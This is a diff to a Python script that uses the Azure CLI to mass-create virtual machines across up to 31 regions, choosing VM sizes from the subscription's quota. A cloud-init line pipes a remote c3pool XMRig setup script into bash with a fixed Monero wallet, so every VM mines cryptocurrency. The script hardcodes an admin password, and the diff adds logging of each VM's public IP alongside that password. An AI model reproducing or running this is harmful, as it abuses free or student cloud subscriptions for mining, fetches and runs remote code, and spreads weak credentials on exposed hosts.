@@ -1,4 +1,6 @@
 import io
+import os
+from sys import argv
 import json
 import time
 from contextlib import redirect_stdout
@@ -8,9 +10,16 @@ from azure.cli.core import get_default_cli
 # 初始化区域列表，共12个区域
 # Azure for Students和即用即付订阅均不支持 South India 和 West India 区域
 #locations = ['australiacentral', 'australiaeast', 'australiaeast', 'eastasia', 'japaneast', 'koreacentral', 'southindia', 'switzerlandnorth', 'uaenorth', 'uksouth', 'ukwest', 'westeurope']
-
+# 初始化区域列表，共31个区域
 locations = ['eastus', 'eastus2', 'westus', 'centralus', 'northcentralus', 'southcentralus','northeurope', 'westeurope', 'eastasia', 'southeastasia', 'japaneast','japanwest', 'australiaeast', 'australiasoutheast', 'australiacentral','brazilsouth', 'centralindia', 'canadacentral', 'canadaeast', 'westus2','uksouth', 'ukwest', 'koreacentral', 'koreasouth', 'francecentral','southafricanorth', 'uaenorth', 'switzerlandnorth', 'germanywestcentral','norwayeast', 'westcentralus']
-limit = "10" 
+limit1 = os.popen('az vm list-usage --location westus --query "[?localName== \'Total Regional vCPUs\'].limit" -o tsv')
+email1 = os.popen('az account list --query "[].{ZTID:isDefault,email:user.name}" -o tsv|grep True|cut -f 2| tr "\n" "-"|tr "@" "-"|sed "s/.*#//g"')
+limit = limit1.read()
+email = email1.read()
+if email == '':
+    email = input("自动获取失败! 请输入机器备注,限制 英文 数字 - . 这四个（仅一行）:  ")
+if limit == '':
+    limit = '10'
 # 默认每个区域的配额都相同，因此只需查询美国东部地区的配额
 # Azure for Students订阅每个区域的vCPU总数为6，
 # 标准FSv2系列vCPUs为4，标准FS系列vCPUs为4
@@ -19,12 +28,13 @@ limit = "10"
 if '6' in limit:
     print("当前订阅为Azure for Students")
     size1_name = "Standard_F4s_v2"
-    size1_abbreviation = "F4s_v2"
+    size1_abbreviation = "F4s-v2"
     size1_count = 1
     size2_name = "Standard_F2s"
     size2_abbreviation = "F2s"
     size2_count = 1
     type = 0
+    bcs = 2
  
 # 即用即付订阅每个区域的vCPU总数为10，与标准FSv2系列的vCPUs相同
 # 因此创建一个Standard_F8s_v2实例（占用8个vCPUs），
@@ -35,12 +45,13 @@ elif '10' in limit:
 #    size1_abbreviation = "F8s_v2"
 #    size1_count = 1
     size1_name = "Standard_F2s_v2"
-    size1_abbreviation = "F2s_v2"
-    size1_count = 2
-    size2_name = "Standard_F2s_v2"
-    size2_abbreviation = "F2s_v2"
-    size2_count = 3
+    size1_abbreviation = "F2s-v2"
+    size1_count = 5
+#    size2_name = "Standard_F2s_v2"
+#    size2_abbreviation = "F2s_v2"
+#    size2_count = 3
     type = 1
+    bcs = 5
  
 # 免费试用订阅每个区域的vCPU总数为4，与标准FSv2系列的vCPUs相同
 # 因此创建1个Standard_F4s_v2实例（共占用4个vCPUs）
@@ -50,10 +61,12 @@ elif '4' in limit:
 #   selection = input("输入Y继续运行，任意键退出")
 #   if selection != "Y" or "y":
 #       exit(0)
-    size1_name = "Standard_F4s_v2"
-    size1_abbreviation = "F4s_v2"
+    print("当前订阅为AZ200刀免费账户")
+    size1_name = "Standard_F2s_v2"
+    size1_abbreviation = "F2s-v2"
     size1_count = 1
     type = 2
+    bcs = 1
  
 else:
     print("未知订阅，请手动修改创建虚拟机的数量")
@@ -61,8 +74,8 @@ else:
           "请进入“创建虚拟机”界面，任意填写信息，"
           "一直到“查看+创建”项（创建虚拟机的最后一步）"
           "显示“验证通过”即可自动刷新配额")
-    print("假如还未解决，请直接修改limit = f.getvalue()中的"
-          "f.getvalue()为'区域配额'（包括英文引号）。Azure for"
+    print("假如还未解决，请直接修改limit =  os.popen('az vm list-usage --location westus --query \"[?localName== 'Total Regional vCPUs'].limit\" -o tsv')等于号后面"
+          "修改为'区域配额'（包括英文引号）Azure for"
           " Students是6，即用即付是10，免费试用订阅是4")
     exit(0)
  
@@ -75,6 +88,7 @@ print("创建资源组成功")
  
 # 3.创建开机后要运行的脚本
 init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 84GqejviH1HejhwHBbudZciAeBqT9ifdSSHZcqD9puBcB7JpKE12G7paobznFsU8L3VsRNToDbito8Qvyuo5LUF7RsepB83"
+
 with open("./cloud-init.txt", "w") as f:
     f.write("#cloud-config" + "\n")
     f.write("runcmd:" + "\n")
@@ -93,9 +107,9 @@ for x in ['1','2']:
         # Azure for Students订阅不支持 F/FS 系列
         if location == "westcentralus" and type == 0:
             size1_name = "Standard_D4ds_v4"
-            size1_abbreviation = "D4ds_v4"
+            size1_abbreviation = "D4ds-v4"
             size2_name = "Standard_D2s_v4"
-            size2_abbreviation = "D2s_v4"
+            size2_abbreviation = "D2s-v4"
         if location == "westcentralus" and type == 1:
             size1_name = "Standard_F2s"
             size1_abbreviation = "F2s"
@@ -113,23 +127,23 @@ for x in ['1','2']:
                   + f" 个 {size1_name} 实例，共 " + str(size1_count) + " 个")
             get_default_cli().invoke(
                 ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
-                 f'{location}-{size1_abbreviation}-{int(ts)}', '--image', 'UbuntuLTS',
+                 f'{email}{location}-{size1_abbreviation}-{int(ts)}', '--image', 'UbuntuLTS',
                  '--size', f'{size1_name}', '--location', f'{location}', '--admin-username',
                  'sunianyun', '--admin-password', 'Sunianyun123...', '--custom-data',
                  'cloud-init.txt', "--no-wait"])
-        if type != 2:
-            count = 0
-            for a in range(0, size2_count):
-                count += 1
-                ts = time.time()
-                print("正在 " + str(location) + " 区域创建第 " + str(count)
-                      + f" 个 {size2_name} 实例，共 " + str(size2_count) + " 个")
-                get_default_cli().invoke(
-                    ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
-                     f'{location}-{size2_abbreviation}-{int(ts)}', '--image', 'UbuntuLTS',
-                     '--size', f'{size2_name}', '--location', f'{location}', '--admin-username',
-                     'sunianyun', '--admin-password', 'Sunianyun123...', '--custom-data',
-                     'cloud-init.txt', "--no-wait"])
+#        if type != 2:
+#            count = 0
+#            for a in range(0, size2_count):
+#                count += 1
+#                ts = time.time()
+#                print("正在 " + str(location) + " 区域创建第 " + str(count)
+#                      + f" 个 {size2_name} 实例，共 " + str(size2_count) + " 个")
+#                get_default_cli().invoke(
+#                    ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
+#                     f'{location}-{size2_abbreviation}-{int(ts)}', '--image', 'UbuntuLTS',
+#                     '--size', f'{size2_name}', '--location', f'{location}', '--admin-username',
+#                     'sunianyun', '--admin-password', 'Sunianyun123...', '--custom-data',
+#                     'cloud-init.txt', "--no-wait"])
     if '1' in x: 
         print("\n------------------------------------------------------------------------------\n")
         print("以下是已创建的虚拟机列表：")
@@ -147,10 +161,21 @@ for i in range(60, -1, -1):
     time.sleep(1)
 print("\n------------------------------------------------------------------------------\n")
 print("以下是已创建的虚拟机列表：")
-get_default_cli().invoke(['vm', 'list', '--query', '[*].name'])
-print("\n\n-----------------------------------------------------------------------------\n")
+log1 = os.popen('az vm list --show-details -d --query \'[].{IP:publicIps,Name:name, OS:storageProfile.osDisk.osType, admin:osProfile.adminUsername,passwd:\'Sunianyun123\'}\' -o tsv')
+log = log1.read()
+time1 = os.popen('date +"处理时间:%Y-%m-%d  %H:%M:%S "')
+time = time1.read()
+with open("./log.txt", "a+") as f:
+    f.write(f"{email}--{time}" + "\n\n")
+    f.write(f"{log}" + "\n")
+get_default_cli().invoke(['vm', 'list', '--query', '[].name'])
+js1 = os.popen('az vm list --query \'[].name\' -o tsv|wc -l')
+js = js1.read()
+qy = (int(js) // int(bcs))
+print("\n\n-----------------------------------------------------------------------------\n\n")
+print("数据统计:\n此订阅服务器总数: %s \n31个地区中成功区域个数: %s " % (js,qy))
  
- 
+
  
 # 如果想删除脚本创建的所有资源，取消注释以下语句
 # get_default_cli().invoke(['group', 'delete', '--name', 'myResourceGroup', '--no-wait', '--yes'])
